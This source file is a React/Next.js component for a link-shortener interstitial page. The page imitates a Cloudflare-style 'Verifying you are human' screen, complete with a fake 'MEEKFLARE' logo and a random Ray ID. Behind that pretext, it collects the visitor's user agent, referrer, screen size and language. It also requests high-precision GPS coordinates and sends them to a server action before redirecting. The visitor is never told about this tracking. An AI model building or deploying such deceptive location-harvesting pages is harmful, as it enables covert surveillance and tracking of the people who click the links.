'use client';

import { useEffect, useState } from 'react';
import { verifyVisitor } from '../actions';

export default function Interstitial({ params }: { params: Promise<{ code: string }> }) {
    const [domain, setDomain] = useState('Loading...');
    const [rayId, setRayId] = useState('');

    useEffect(() => {
        const runVerification = async () => {
            const unwrappedParams = await params;

            // Generate Ray ID
            if (typeof window !== 'undefined') {
                setRayId(Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10));
            }

            const info = {
                shortCode: unwrappedParams.code,
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                latitude: null as number | null,
                longitude: null as number | null,
                accuracy: null as number | null,
            };

            const send = async (finalInfo: typeof info) => {
                try {
                    const res = await verifyVisitor(finalInfo);
                    if (res?.redirectUrl) {
                        // Extract domain from the redirect URL to display
                        try {
                            const url = new URL(res.redirectUrl);
                            setDomain(url.hostname);
                        } catch {
                            setDomain(res.redirectUrl);
                        }

                        // Small delay to show the verification screen
                        setTimeout(() => {
                            window.location.replace(res.redirectUrl);
                        }, 1500);
                    } else {
                        window.location.replace('https://google.com');
                    }
                } catch (e) {
                    window.location.replace('https://google.com');
                }
            };

            // Request Geolocation with full precision
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Store full precision coordinates
                        info.latitude = position.coords.latitude;
                        info.longitude = position.coords.longitude;
                        info.accuracy = position.coords.accuracy;
                        send(info);
                    },
                    (error) => {
                        console.log("Geo denied");
                        send(info);
                    },
                    {
                        timeout: 4000,
                        enableHighAccuracy: true, // Request high accuracy GPS
                        maximumAge: 0 // Don't use cached position
                    }
                );
            } else {
                send(info);
            }
        };

        runVerification();
    }, [params]);

    return (
        <div style={{
            backgroundColor: '#1a1a1a',
            color: '#d9d9d9',
            fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
            minHeight: '100vh',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '2rem'
        }}>
            <div style={{ maxWidth: '600px', width: '100%' }}>
                {/* Header with Shield Icon */}
                <div style={{ marginBottom: '1rem' }}>
                    <h1 style={{
                        fontSize: '2rem',
                        fontWeight: 500,
                        color: '#fff',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '10px',
                        marginBottom: '0.5rem'
                    }}>
                        <span style={{ fontSize: '2rem' }}>🛡️</span>
                        {domain}
                    </h1>
                </div>

                {/* Verification Message */}
                <h2 style={{
                    fontSize: '1.25rem',
                    fontWeight: 400,
                    marginBottom: '2rem',
                    color: '#d9d9d9'
                }}>
                    Verifying you are human. This may take a few seconds.
                </h2>

                {/* Verification Box */}
                <div style={{
                    backgroundColor: '#2d2d2d',
                    border: '1px solid #444',
                    padding: '1.5rem',
                    borderRadius: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    marginBottom: '2rem'
                }}>
                    {/* Animated Dots */}
                    <div style={{ display: 'inline-flex', marginRight: '15px' }}>
                        <div className="bubble"></div>
                        <div className="bubble"></div>
                        <div className="bubble"></div>
                    </div>

                    {/* Verifying Text */}
                    <span style={{ fontSize: '1rem', fontWeight: 500, flexGrow: 1 }}>
                        Verifying...
                    </span>

                    {/* Logo */}
                    <div style={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'flex-end',
                        fontSize: '0.7rem',
                        color: '#999'
                    }}>
                        <span style={{ fontWeight: 'bold', color: '#fff', fontSize: '0.6rem', marginBottom: '2px' }}>
                            MEEKFLARE
                        </span>
                        <span style={{ fontSize: '0.6rem' }}>Privacy · Terms</span>
                    </div>
                </div>

                {/* Bottom Message */}
                <div style={{ fontSize: '1rem', marginBottom: '2rem', color: '#d9d9d9' }}>
                    {domain} needs to review the security of your connection before proceeding.
                </div>

                {/* Footer */}
                <div style={{ marginTop: '2rem', fontSize: '0.8rem', color: '#888' }}>
                    Ray ID: <span style={{ fontFamily: 'monospace' }}>{rayId}</span>
                </div>
            </div>

            {/* CSS for animated dots */}
            <style jsx>{`
                .bubble {
                    width: 6px;
                    height: 6px;
                    background-color: #4CAF50;
                    border-radius: 50%;
                    margin: 0 2px;
                    animation: flash 1.4s infinite ease-in-out both;
                }
                .bubble:nth-child(1) {
                    animation-delay: -0.32s;
                }
                .bubble:nth-child(2) {
                    animation-delay: -0.16s;
                }
                @keyframes flash {
                    0%, 80%, 100% {
                        transform: scale(0);
                        opacity: 0.5;
                    }
                    40% {
                        transform: scale(1);
                        opacity: 1;
                    }
                }
            `}</style>
        </div>
    );
}
